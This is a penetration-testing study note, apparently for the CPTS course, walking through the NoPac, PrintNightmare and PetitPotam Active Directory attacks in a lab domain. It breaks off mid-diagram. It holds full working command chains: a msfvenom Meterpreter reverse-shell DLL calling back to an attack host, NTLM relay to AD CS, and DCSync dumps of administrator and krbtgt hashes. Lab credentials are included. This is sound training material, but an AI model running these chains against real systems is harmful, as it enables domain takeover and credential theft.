# ⚔️ Bleeding Edge Vulnerabilities — Active Directory

> [!info] 📚 CPTS Context  
> This section covers three relatively recent Active Directory attack techniques as presented in the source material:
> 
> 1. **NoPac / SamAccountName Spoofing** — CVE-2021-42278 + CVE-2021-42287
>     
> 2. **PrintNightmare** — CVE-2021-34527 + CVE-2021-1675
>     
> 3. **PetitPotam / MS-EFSRPC** — CVE-2021-36942
>     
> 
> The source material was written in **April 2022** and explicitly presents these as advanced topics intended for controlled lab environments. Their purpose is to demonstrate how newly disclosed vulnerabilities can become quick paths to privilege escalation or domain compromise when organizations have not yet patched.

---

# 1️⃣ 🧾 Command Cheat Sheet

|Command|What it does|
|---|---|
|`git clone https://github.com/SecureAuthCorp/impacket.git`|Clones the Impacket repository.|
|`python setup.py install`|Installs the cloned Impacket version used by the source's NoPac setup.|
|`git clone https://github.com/Ridter/noPac.git`|Clones the NoPac exploit repository.|
|`sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`|Scans for NoPac vulnerability and checks `ms-DS-MachineAccountQuota` / TGT behavior.|
|`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`|Uses NoPac to impersonate Administrator and obtain a semi-interactive shell.|
|`ls`|Confirms the `.ccache` ticket file saved by NoPac.|
|`sudo python3 noPac.py ... --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`|Uses NoPac to perform DCSync through `secretsdump.py` functionality.|
|`pip3 uninstall impacket`|Removes the installed Impacket version before installing cube0x0's version for the PrintNightmare exploit.|
|`git clone https://github.com/cube0x0/impacket`|Clones the Impacket version required by the source's PrintNightmare exploit.|
|`cd impacket`|Enters the cloned Impacket directory.|
|`python3 ./setup.py install`|Installs cube0x0's Impacket version.|
|`rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`|Checks whether MS-RPRN and MS-PAR printing protocols are exposed.|
|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll`|Generates a Windows x64 Meterpreter reverse TCP DLL payload.|
|`sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`|Creates an SMB share hosting the DLL payload.|
|`use exploit/multi/handler`|Selects Metasploit's generic multi-handler.|
|`set PAYLOAD windows/x64/meterpreter/reverse_tcp`|Configures the reverse Meterpreter payload.|
|`set LHOST 172.16.5.225`|Sets the attack-host callback address.|
|`set LPORT 8080`|Sets the callback port.|
|`run`|Starts the Metasploit reverse handler.|
|`sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'`|Runs the source's PrintNightmare exploit against the target using the hosted DLL.|
|`whoami`|Verifies the resulting Windows security context.|
|`sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`|Starts Impacket NTLM relay against AD CS Web Enrollment using the `DomainController` certificate template.|
|`python3 PetitPotam.py 172.16.5.225 172.16.5.5`|Attempts to coerce the Domain Controller into authenticating to the attack host.|
|`misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`|Mimikatz alternative for triggering the PetitPotam EFS authentication behavior.|
|`python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <certificate> dc01.ccache`|Uses the obtained certificate to request a TGT for the Domain Controller machine account.|
|`export KRB5CCNAME=dc01.ccache`|Tells Kerberos-aware Linux tools to use the saved `.ccache` ticket.|
|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Uses the cached DC TGT to perform DCSync and retrieve the specified account's secrets.|
|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Simplified cached-ticket version shown in the source.|
|`klist`|Displays Kerberos tickets currently available in the Linux ticket cache.|
|`crackmapexec smb 172.16.5.5 -u administrator -H <NTLM hash>`|Validates access using the recovered NTLM hash.|
|`python /opt/PKINITtools/getnthash.py -key <AS-REP encryption key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`|Uses Kerberos U2U/PAC to recover the target machine account's NT hash.|
|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes <LM>:<NT>`|Performs DCSync using the recovered machine-account NT hash.|
|`.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64 certificate> /ptt`|Requests a TGT using the certificate and immediately performs pass-the-ticket.|
|`klist` _(Windows)_|Confirms the injected/cached Kerberos tickets.|
|`mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`|Performs DCSync for the `krbtgt` account from the Windows attack host.|

---

# 2️⃣ 🧩 Tool Roles & Differences

The three vulnerabilities use very different mechanisms, even though the end goal can be similar: **turn a foothold or unauthenticated position into privileged access to the domain**.

|Technique|Starting Position|Core Weakness|Main Result|
|---|---|---|---|
|**NoPac**|Standard domain user|Computer-account `sAMAccountName` manipulation + Kerberos/SAM flaws|SYSTEM / privileged access on the DC|
|**PrintNightmare**|Standard domain credentials in the source|Print Spooler vulnerabilities|SYSTEM shell on target|
|**PetitPotam**|Unauthenticated|MS-EFSRPC authentication coercion + NTLM relay to AD CS|DC certificate → DC TGT → DCSync|

### 🧠 Big Picture

```text
                    ACTIVE DIRECTORY
                           │
          ┌────────────────┼─────────────────┐
          ↓                ↓                 ↓
       NoPac         PrintNightmare      PetitPotam
          │                │                 │
          │                │                 ↓
          │                │          Coerce DC authentication
          │                │                 │
          ↓                ↓                 ↓
     Kerberos /         Print              NTLM
     SAM spoofing       Spooler             │
          │                │                 ↓
          ↓                ↓             AD CS Relay
      DC access        SYSTEM shell          │
          │                │                 ↓
          └────────────────┴────────────→ DC privileges
                                             │
                                             ↓
                                           TGT
                                             │
                                             ↓
                                          DCSync
                                             │
                                             ↓
                                     Domain credentials
```

> [!important] 🎯 CPTS Mental Model  
> Don't memorize these as three unrelated exploits.
> 
> Ask:
> 
> **"What primitive does this vulnerability give me, and what can I chain that primitive into?"**
> 
> - NoPac → **Kerberos identity confusion** → privileged DC access
>     
> - PrintNightmare → **remote code execution as SYSTEM** → DC compromise
>     
> - PetitPotam → **forced machine authentication** → NTLM relay → certificate → TGT → DCSync
>     

---

# 3️⃣ 🧠 Why "Bleeding Edge" Vulnerabilities Matter

Organizations often have delays between:

```text
Vulnerability disclosed
        ↓
Patch released
        ↓
Patch tested
        ↓
Patch approved
        ↓
Patch deployed
        ↓
All systems actually patched
```

That delay creates an assessment opportunity.

A recently disclosed vulnerability may be particularly valuable when:

- the target is not fully patched;
    
- the vulnerability affects a critical AD service;
    
- exploitation requires only ordinary domain credentials;
    
- exploitation can be chained into privileged access;
    
- the vulnerability affects a Domain Controller;
    
- the organization has not yet implemented the recommended mitigations.
    

The source emphasizes that these attacks should be treated cautiously because even techniques described as comparatively "safe" can cause service disruption. For example, PrintNightmare can potentially crash the Print Spooler service.

---

# 4️⃣ 🏗️ Scenario Setup

The source performs the examples from a **Linux attack host**, specifically the `ATTACK01` host.

For the Windows-based portions involving:

- [Rubeus](https://github.com/GhostPack/Rubeus)
    
- Mimikatz
    
- pass-the-ticket
    

the source suggests using the `MS01` attack host.

The important workflow is:

```text
Linux ATTACK01
     │
     ├── NoPac
     ├── PrintNightmare
     └── PetitPotam
              │
              ↓
       Base64 DC certificate
              │
              ├── Linux → gettgtpkinit.py
              │
              └── Windows → Rubeus
```

---

# 5️⃣ 🚨 NoPac — SamAccountName Spoofing

## 5.1 What Is NoPac?

NoPac, also called:

- **Sam_The_Admin**
    
- **SamAccountName Spoofing**
    

combines:

- **CVE-2021-42278**
    
- **CVE-2021-42287**
    

The source describes the combined attack as allowing intra-domain privilege escalation from a standard domain user to Domain Admin-level access through exploitation of the affected AD behavior.

### CVE Roles

|CVE|Role according to source|
|---|---|
|**CVE-2021-42278**|SAM bypass vulnerability|
|**CVE-2021-42287**|Vulnerability involving the Kerberos Privilege Attribute Certificate (PAC) in AD DS|

The exploit path abuses the ability to modify a **computer account's `SamAccountName`** and make it match the `SamAccountName` of a Domain Controller.

---

# 6️⃣ 🧬 NoPac — The Core Attack Concept

A simplified representation:

```text
👤 Standard domain user
        │
        ↓
Can add computer account
        │
        ↓
Computer account exists
        │
        ↓
Change its sAMAccountName
        │
        ↓
Match Domain Controller's name
        │
        ↓
Request Kerberos ticket
        │
        ↓
Kerberos name confusion
        │
        ↓
Ticket associated with DC identity
        │
        ↓
Impersonate privileged identity
        │
        ↓
SYSTEM / DC access
```

The source notes that authenticated users can, by default, add up to **10 computers to a domain** through `ms-DS-MachineAccountQuota`.

This is therefore an important enumeration value:

```text
ms-DS-MachineAccountQuota
```

If it is set to:

```text
10
```

the default-style machine-account creation behavior exists.

If an administrator sets it to:

```text
0
```

the source states that this prevents the user from adding a new machine account, causing this NoPac attack path to fail. It also notes that setting this value to `0` can prevent several other AD attacks.

> [!tip] 🔎 Enumeration Mindset  
> Whenever you have ordinary domain-user credentials, don't only enumerate users and groups.
> 
> Also ask:
> 
> **"What can this account create or modify?"**
> 
> `ms-DS-MachineAccountQuota` is one example of an AD configuration value that can materially change your attack paths.

---

# 7️⃣ 🛠️ Installing / Preparing NoPac

The source uses [Impacket](https://github.com/fortra/impacket) because NoPac relies on several Impacket components.

### Clone Impacket

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

### Install

```bash
python setup.py install
```

Then clone the NoPac repository:

```bash
git clone https://github.com/Ridter/noPac.git
```

The source notes that NoPac is already located at:

```text
/opt/noPac
```

on the provided attack host.

---

# 8️⃣ 🔎 NoPac Vulnerability Scan

The first step is not immediately exploitation.

Use:

```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

The important output is:

```text
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

The scanner is useful because it establishes two important facts:

```text
1. MachineAccountQuota allows machine creation
2. Kerberos behavior indicates the target is vulnerable
```

The source specifically describes the scanner as using a standard domain account to attempt to obtain a TGT from the target Domain Controller.

---

# 9️⃣ 💥 NoPac — Obtaining a SYSTEM Shell

The source then uses:

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
-dc-ip 172.16.5.5 \
-dc-host ACADEMY-EA-DC01 \
-shell \
--impersonate administrator \
-use-ldap
```

The important sequence in the output is:

```text
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = ...
[*] Successfully added machine account WIN-LWJFQMAXRVN$
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Exploiting..
[!] Launching semi-interactive shell
C:\Windows\system32>
```

### 🧠 What Actually Happened?

The output exposes the attack chain:

```text
Create machine account
        ↓
Temporarily change sAMAccountName
        ↓
Make it equal to DC's sAMAccountName
        ↓
Obtain Kerberos ticket
        ↓
Restore original machine name
        ↓
Use cached ticket
        ↓
Impersonate Administrator
        ↓
Obtain shell
```

The source notes that the resulting shell is established through `smbexec.py`.

---

# 🔟 🗂️ NoPac `.ccache` Files

NoPac saves Kerberos tickets to the attack-host filesystem.

The source demonstrates:

```bash
ls
```

and obtains:

```text
administrator_DC01.INLANEFREIGHT.local.ccache
noPac.py
requirements.txt
scanner.py
utils
README.md
```

This is important because the `.ccache` file represents a reusable Kerberos credential artifact.

> [!warning] 🧹 OPSEC / Artifact Awareness  
> The source explicitly points out that NoPac creates `.ccache` files on disk.
> 
> During an assessment, don't only ask:
> 
> **"Did the exploit work?"**
> 
> Also ask:
> 
> **"What credentials, tickets, payloads, services, or files did the exploit leave behind?"**

---

# 1️⃣1️⃣ 🔐 NoPac → DCSync

The source also demonstrates a direct DCSync path using:

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
-dc-ip 172.16.5.5 \
-dc-host ACADEMY-EA-DC01 \
--impersonate administrator \
-use-ldap \
-dump \
-just-dc-user INLANEFREIGHT/administrator
```

The output shows:

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:...:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
```

This is effectively:

```text
NoPac
  ↓
Impersonate privileged identity
  ↓
DCSync
  ↓
NTLM hash / Kerberos keys
```

The source notes that this method still creates a `.ccache` file on disk.

---

# 1️⃣2️⃣ ⚠️ NoPac Shell + SMBEXEC Considerations

The shell obtained through NoPac uses `smbexec.py`.

The source explains that the shell is **semi-interactive** and has an important limitation:

> With `smbexec` shells, use exact paths rather than relying on directory navigation with `cd`.

### Windows Defender / EDR

The source also highlights an important operational consideration.

`smbexec.py` creates services and uses batch files to execute commands remotely.

The described behavior includes:

```text
Create service
     ↓
Send command through SMB
     ↓
Create execute.bat
     ↓
Write temporary command
     ↓
Execute
     ↓
Delete temporary file
```

Because this behavior resembles known malicious remote-execution activity, Windows Defender or another AV/EDR product may detect it.

The source specifically notes that a shell may be established but commands can subsequently fail when Defender/EDR is active.

> [!important] 🧠 CPTS Lesson  
> **Successful exploitation ≠ successful post-exploitation.**
> 
> Your exploit may work while your chosen execution mechanism is detected or blocked.
> 
> Separate:
> 
> ```text
> Vulnerability works
>       ↓
> Privilege obtained
>       ↓
> Execution mechanism
>       ↓
> Detection / prevention
> ```

---

# 1️⃣3️⃣ 💣 PrintNightmare

## What Is PrintNightmare?

The source refers to **PrintNightmare** as the name associated with:

- **CVE-2021-34527**
    
- **CVE-2021-1675**
    

These vulnerabilities affect the Windows **Print Spooler** service.

The source demonstrates a remote exploitation path capable of obtaining a **SYSTEM shell on a Windows Server 2019 Domain Controller**.

---

# 1️⃣4️⃣ 🧬 PrintNightmare Attack Chain

```text
Standard domain credentials
          ↓
Check Print protocols
          ↓
MS-RPRN / MS-PAR exposed
          ↓
Prepare DLL payload
          ↓
Host DLL over SMB
          ↓
Start reverse handler
          ↓
Run PrintNightmare exploit
          ↓
Target loads DLL
          ↓
Reverse connection
          ↓
Meterpreter
          ↓
SYSTEM shell
```

---

# 1️⃣5️⃣ 🛠️ Install the PrintNightmare Exploit

Clone the exploit:

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

The source states that this exploit requires cube0x0's version of Impacket.

Remove the existing version:

```bash
pip3 uninstall impacket
```

Clone the required version:

```bash
git clone https://github.com/cube0x0/impacket
```

Enter it:

```bash
cd impacket
```

Install:

```bash
python3 ./setup.py install
```

The lab already has the required version installed on `ATTACK01`.

---

# 1️⃣6️⃣ 🔎 Enumerating MS-RPRN / MS-PAR

Before exploiting, check whether the relevant printing protocols are exposed:

```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Expected output:

```text
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

### 🧠 Why This Check Matters

The methodology is:

```text
Do not blindly exploit
        ↓
Identify vulnerable service/protocol
        ↓
Confirm exposure
        ↓
Choose exploit
```

This is an example of **targeted enumeration before exploitation**.

---

# 1️⃣7️⃣ 📦 Generate the DLL Payload

The source creates a Meterpreter reverse TCP DLL:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=172.16.5.225 \
LPORT=8080 \
-f dll > backupscript.dll
```

Important output:

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows
[-] No arch selected, selecting arch: x64
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```

### Payload Parameters

|Parameter|Meaning|
|---|---|
|`-p`|Payload|
|`windows/x64/meterpreter/reverse_tcp`|Windows x64 Meterpreter reverse TCP|
|`LHOST`|Attack-host callback address|
|`LPORT`|Callback port|
|`-f dll`|Generate DLL format|
|`>`|Save output to `backupscript.dll`|

---

# 1️⃣8️⃣ 📡 Host the Payload Through SMB

Create an SMB share:

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Conceptually:

```text
ATTACK01
   │
   │ SMB
   ↓
\\172.16.5.225\CompData\backupscript.dll
```

The target is subsequently instructed to access this UNC path.

---

# 1️⃣9️⃣ 🎧 Start the Metasploit Handler

In Metasploit:

```text
use exploit/multi/handler
```

Configure the payload:

```text
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Set callback:

```text
set LHOST 172.16.5.225
set LPORT 8080
```

Start:

```text
run
```

Expected:

```text
[*] Started reverse TCP handler on 172.16.5.225:8080
```

The two components now exist:

```text
SMB Server
    ↓
backupscript.dll

Metasploit Handler
    ↑
reverse connection
```

---

# 2️⃣0️⃣ 💥 Run PrintNightmare

The source executes:

```bash
sudo python3 CVE-2021-1675.py \
inlanefreight.local/forend:Klmcargo2@172.16.5.5 \
'\\172.16.5.225\CompData\backupscript.dll'
```

The exploit output shows:

```text
[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found ...
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
...
```

### 🔑 Important Detail

The final argument is the UNC path:

```text
\\<ATTACK-HOST-IP>\<ShareName>\<payload>.dll
```

The source explains the intended chain:

```text
PrintNightmare
     ↓
Target accesses SMB share
     ↓
Target executes DLL
     ↓
DLL connects back
     ↓
Metasploit handler
     ↓
Meterpreter
```

---

# 2️⃣1️⃣ 👑 PrintNightmare → SYSTEM

The resulting Meterpreter session:

```text
[*] Meterpreter session 1 opened
```

Then:

```text
(Meterpreter 1)(C:\Windows\system32) > shell
```

Verify:

```cmd
whoami
```

Result:

```text
nt authority\system
```

The source demonstrates obtaining `NT AUTHORITY\SYSTEM` on the Domain Controller starting from standard domain-user credentials.

---

# 2️⃣2️⃣ 🧲 PetitPotam — MS-EFSRPC

## What Is PetitPotam?

PetitPotam is associated with:

**CVE-2021-36942**

The source describes it as an **LSA spoofing vulnerability** involving:

- **LSARPC**
    
- **MS-EFSRPC**
    
- NTLM authentication
    
- authentication coercion
    

The key difference from NoPac and PrintNightmare is the starting position:

> The source demonstrates PetitPotam from an **unauthenticated** position.

---

# 2️⃣3️⃣ 🧠 The PetitPotam Primitive

The important concept is not simply:

> "PetitPotam gives a shell."

Instead:

> **PetitPotam coerces the Domain Controller into authenticating to a system controlled by the attacker.**

Conceptually:

```text
Unauthenticated attacker
          │
          ↓
PetitPotam / MS-EFSRPC
          │
          ↓
Coerce Domain Controller
          │
          ↓
DC authenticates to attacker
          │
          ↓
NTLM authentication captured
          │
          ↓
NTLM relay
          │
          ↓
AD CS Web Enrollment
          │
          ↓
Certificate issued for DC
          │
          ↓
DC TGT
          │
          ↓
DCSync
          │
          ↓
Domain credentials
```

This is the most important mental model for the entire PetitPotam section.

---

# 2️⃣4️⃣ 🔗 PetitPotam + AD CS

The source's attack depends on **Active Directory Certificate Services (AD CS)** being present and usable.

The authentication flow is:

```text
DC
 │
 │ NTLM authentication
 ↓
Attack Host
 │
 │ Relay
 ↓
CA Web Enrollment
 │
 │ Certificate Signing Request
 ↓
Certificate for DC
 │
 ↓
PKINIT
 │
 ↓
TGT for DC
 │
 ↓
DCSync
```

The source specifically describes relaying the Domain Controller's authentication to the Certificate Authority's Web Enrollment page and requesting a certificate using the appropriate AD CS template.

> [!important] 🎯 CPTS Connection  
> This is a perfect example of **chaining vulnerabilities / misconfigurations**.
> 
> PetitPotam alone provides an authentication-coercion primitive.
> 
> AD CS provides the mechanism for turning that authentication into a certificate.
> 
> PKINIT turns the certificate into a TGT.
> 
> The DC's privileges then make DCSync possible.

---

# 2️⃣5️⃣ 📡 Start ntlmrelayx.py

Start [Impacket](https://github.com/fortra/impacket)'s `ntlmrelayx.py`:

```bash
sudo ntlmrelayx.py -debug -smb2support \
--target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp \
--adcs \
--template DomainController
```

Important options:

|Option|Purpose|
|---|---|
|`-debug`|Enables detailed debugging output.|
|`-smb2support`|Enables SMB2 support.|
|`--target`|Specifies the AD CS Web Enrollment target.|
|`--adcs`|Enables AD CS relay functionality.|
|`--template DomainController`|Requests the specified certificate template.|

The source says that if the CA location is unknown, `certi` can be used to attempt to locate it.

---

# 2️⃣6️⃣ 📞 Trigger PetitPotam

In another terminal:

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

The source describes the parameters as:

```text
172.16.5.225 → attack host
172.16.5.5   → Domain Controller
```

PetitPotam attempts to trigger authentication from the DC to the attack host.

The source also mentions alternative implementations:

### Mimikatz

```text
misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>
```

### PowerShell

The source references:

```text
Invoke-Petitpotam.ps1
```

The actual trigger demonstrated uses the EFS RPC method:

```text
EfsRpcOpenFileRaw
```

Successful output includes:

```text
Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
[+] Connected!
[+] Binding to ...
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!

[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

The interesting point is that the expected `ERROR_BAD_NETPATH` is treated by the tool as confirmation that the coercion worked.

---

# 2️⃣7️⃣ 📜 Capture the DC Certificate

Return to the `ntlmrelayx.py` terminal.

The successful relay shows:

```text
[*] Connection from INLANEFREIGHT/ACADEMY-EA-DC01$
[*] Authenticating ... as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$:
MIIStQIBAzCCEn8GCSqGSI...
```

The critical artifact is:

```text
Base64 certificate of user ACADEMY-EA-DC01$
```

This certificate becomes the bridge between:

```text
NTLM relay
      ↓
AD CS certificate
      ↓
PKINIT
```

The source demonstrates obtaining this certificate through the AD CS relay.

---

# 2️⃣8️⃣ 🔑 Certificate → TGT with gettgtpkinit.py

The source then uses [PKINITtools](https://github.com/dirkjanm/PKINITtools).

Command:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py \
INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ \
-pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= \
dc01.ccache
```

The tool outputs an **AS-REP encryption key**:

```text
70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
```

and saves the TGT:

```text
Saved TGT to file
```

The resulting file is:

```text
dc01.ccache
```

---

# 2️⃣9️⃣ 🗃️ KRB5CCNAME — Using the TGT

Set:

```bash
export KRB5CCNAME=dc01.ccache
```

This tells Kerberos-aware Linux tools:

```text
Use dc01.ccache
as the current Kerberos credential cache.
```

Conceptually:

```text
dc01.ccache
     ↓
KRB5CCNAME
     ↓
Kerberos-aware tools
     ↓
Authenticate as DC machine account
```

---

# 3️⃣0️⃣ 🩸 DC TGT → DCSync

Now use:

```bash
secretsdump.py \
-just-dc-user INLANEFREIGHT/administrator \
-k \
-no-pass \
"ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

The important flags:

|Flag|Meaning|
|---|---|
|`-just-dc-user`|Retrieve secrets for the specified domain account.|
|`-k`|Use Kerberos authentication.|
|`-no-pass`|Do not prompt for a password.|
|`ACADEMY-EA-DC01$`|Authenticate as the DC machine account.|

Output:

```text
[*] Dumping Domain Credentials
[*] Using the DRSUAPI method to get NTDS.DIT secrets

inlanefreight.local\administrator:500:...:88ad09182de639ccc6579eb0849751cf:::

[*] Kerberos keys grabbed
```

This demonstrates the core chain:

```text
DC Certificate
     ↓
DC TGT
     ↓
Kerberos authentication
     ↓
DCSync
     ↓
Administrator NT hash
```

---

# 3️⃣1️⃣ 🧾 klist — Inspect the Linux Kerberos Cache

The source demonstrates:

```bash
klist
```

Output:

```text
Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

### 🧠 Why `klist` Matters

Whenever you are doing Kerberos-based attacks, `klist` answers:

> **"What Kerberos identity/tickets does this system currently have?"**

This is especially useful when troubleshooting:

- wrong ticket;
    
- wrong principal;
    
- missing TGT;
    
- wrong cache;
    
- expired ticket.
    

The source notes that `klist` requires the `krb5-user` package on the attack host.

---

# 3️⃣2️⃣ 🔓 Validate Administrator Access

The source then validates the recovered Administrator NT hash:

```bash
crackmapexec smb 172.16.5.5 \
-u administrator \
-H 88ad09182de639ccc6579eb0849751cf
```

The output includes:

```text
[+] INLANEFREIGHT.LOCAL\administrator ... (Pwn3d!)
```

This provides an independent validation that the recovered credential can authenticate to SMB on the Domain Controller.

> [!success] ✅ Validation Mindset  
> Don't stop at:
> 
> ```text
> "I obtained a hash."
> ```
> 
> Validate the credential against the target service.
> 
> ```text
> Artifact obtained
>       ↓
> Credential extracted
>       ↓
> Authentication tested
>       ↓
> Privilege confirmed
> ```

---

# 3️⃣3️⃣ 🔑 Alternate PetitPotam Path — Recover DC NT Hash

Once the DC TGT exists, the source demonstrates another route.

Use:

```bash
python /opt/PKINITtools/getnthash.py \
-key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 \
INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

The tool uses:

```text
TGT from cache
     ↓
Kerberos U2U
     ↓
TGS request to self
     ↓
PAC
     ↓
Recover NT hash
```

Output:

```text
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```

The source explains that the PAC contains the NT hash and that the AS-REP encryption key obtained during TGT acquisition is used to decrypt it.

---

# 3️⃣4️⃣ 🩸 DC NT Hash → DCSync

The recovered machine-account NT hash can then be used:

```bash
secretsdump.py \
-just-dc-user INLANEFREIGHT/administrator \
"ACADEMY-EA-DC01$"@172.16.5.5 \
-hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

Output again demonstrates:

```text
[*] Dumping Domain Credentials
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

and retrieves the Administrator hash and Kerberos keys.

### 🧠 Two Paths After Obtaining the Certificate

```text
             DC certificate
                   │
          ┌────────┴────────┐
          ↓                 ↓
 gettgtpkinit.py          Rubeus
          │                 │
          ↓                 ↓
      DC TGT              DC TGT
          │                 │
          ↓                 ↓
    getnthash.py        Pass-the-ticket
          │                 │
          ↓                 ↓
      DC NT hash        Windows access
          │                 │
          └────────┬────────┘
                   ↓
                 DCSync
```

---

# 3️⃣5️⃣ 🪟 Alternate Windows Path — Rubeus

The source also demonstrates performing the certificate → TGT → PTT operation from Windows using [Rubeus](https://github.com/GhostPack/Rubeus).

Command:

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

Important options:

|Option|Purpose|
|---|---|
|`asktgt`|Requests a TGT.|
|`/user:`|Specifies the account.|
|`/certificate:`|Supplies the certificate.|
|`/ptt`|Immediately imports the obtained ticket for pass-the-ticket.|

Important output:

```text
[*] Action: Ask TGT
[*] Using PKINIT
[*] Building AS-REQ (w/ PKINIT preauth)
[*] Using domain controller: 172.16.5.5:88
[+] TGT request successful!
[+] Ticket successfully imported!
```

The source notes that this route requires the Windows `MS01` attack host.

---

# 3️⃣6️⃣ 🎟️ Confirm the Rubeus Ticket

Run:

```powershell
klist
```

The source shows cached tickets for:

```text
Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
```

and also a CIFS ticket:

```text
Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
```

The important mental model:

```text
Rubeus /ptt
     ↓
Ticket imported into current logon session
     ↓
klist
     ↓
Verify ticket exists
```

---

# 3️⃣7️⃣ 🩸 Rubeus PTT → DCSync with Mimikatz

Because a Domain Controller machine account has replication privileges, the source then uses Mimikatz.

Launch:

```powershell
cd .\mimikatz\x64\
.\mimikatz.exe
```

Then:

```text
lsadump::dcsync /user:inlanefreight\krbtgt
```

Output includes:

```text
Object RDN           : krbtgt

SAM Username         : krbtgt

Credentials:
  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
```

The source notes that the recovered `krbtgt` NT hash could then be used to create a Golden Ticket and establish persistence. It also notes that DCSync can retrieve other privileged users' hashes.

---

# 3️⃣8️⃣ 🧠 PetitPotam — Complete Mental Model

This is the chain to remember:

```text
                 UNA AUTHENTICATED
                     ATTACKER
                        │
                        ↓
                 PetitPotam
                        │
                        ↓
              MS-EFSRPC coercion
                        │
                        ↓
               DC authenticates
